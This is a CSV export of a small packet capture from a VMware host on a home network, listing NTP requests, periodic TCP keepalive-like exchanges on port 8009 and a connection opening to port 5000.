"No.","Time","Source","Destination","Protocol","Length","Info","src_mac"
"51","2023-10-21 13:47:50.278860362","192.168.1.227","162.159.200.123","NTP","90","NTP Version 4, client","VMware_65:77:ad"
"73","2023-10-21 13:47:52.205410344","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=1 Ack=1 Win=501 Len=110 TSval=2919158974 TSecr=1841245560 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"76","2023-10-21 13:47:52.208549787","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=111 Ack=111 Win=501 Len=0 TSval=2919158978 TSecr=1841250576","VMware_65:77:ad"
"78","2023-10-21 13:47:52.208973689","192.168.1.227","192.168.1.1","TCP","66","[TCP Dup ACK 76#1] 42434  >  8009 [ACK] Seq=111 Ack=111 Win=501 Len=0 TSval=2919158978 TSecr=1841250576","VMware_65:77:ad"
"222","2023-10-21 13:47:57.212778198","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=111 Ack=111 Win=501 Len=110 TSval=2919163982 TSecr=1841250576 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"224","2023-10-21 13:47:57.218903730","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=221 Ack=221 Win=501 Len=0 TSval=2919163988 TSecr=1841255583","VMware_65:77:ad"
"318","2023-10-21 13:48:02.223156428","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=221 Ack=221 Win=501 Len=110 TSval=2919168990 TSecr=1841255583 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"320","2023-10-21 13:48:02.226410922","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=331 Ack=331 Win=501 Len=0 TSval=2919168995 TSecr=1841260593","VMware_65:77:ad"
"510","2023-10-21 13:48:07.229317688","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=331 Ack=331 Win=501 Len=110 TSval=2919173998 TSecr=1841260593 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"512","2023-10-21 13:48:07.231686519","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=441 Ack=441 Win=501 Len=0 TSval=2919174001 TSecr=1841265599","VMware_65:77:ad"
"717","2023-10-21 13:48:12.239023845","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=441 Ack=441 Win=501 Len=110 TSval=2919179008 TSecr=1841265599 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"719","2023-10-21 13:48:12.260518289","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=551 Ack=551 Win=501 Len=0 TSval=2919179028 TSecr=1841270608","VMware_65:77:ad"
"924","2023-10-21 13:48:17.273019689","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=551 Ack=551 Win=501 Len=110 TSval=2919184039 TSecr=1841270608 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"926","2023-10-21 13:48:17.283623104","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=661 Ack=661 Win=501 Len=0 TSval=2919184052 TSecr=1841275650","VMware_65:77:ad"
"1036","2023-10-21 13:48:22.284580754","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=661 Ack=661 Win=501 Len=110 TSval=2919189053 TSecr=1841275650 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"1038","2023-10-21 13:48:22.286826625","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=771 Ack=771 Win=501 Len=0 TSval=2919189056 TSecr=1841280654","VMware_65:77:ad"
"1050","2023-10-21 13:48:22.475488807","192.168.1.227","162.159.200.123","NTP","90","NTP Version 4, client","VMware_65:77:ad"
"1052","2023-10-21 13:48:22.565056815","192.168.1.227","192.168.1.183","TCP","74","52686  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341538638 TSecr=0 WS=128","VMware_65:77:ad"
"1056","2023-10-21 13:48:22.566663823","192.168.1.227","192.168.1.183","TCP","66","52686  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341538641 TSecr=1741518850","VMware_65:77:ad"
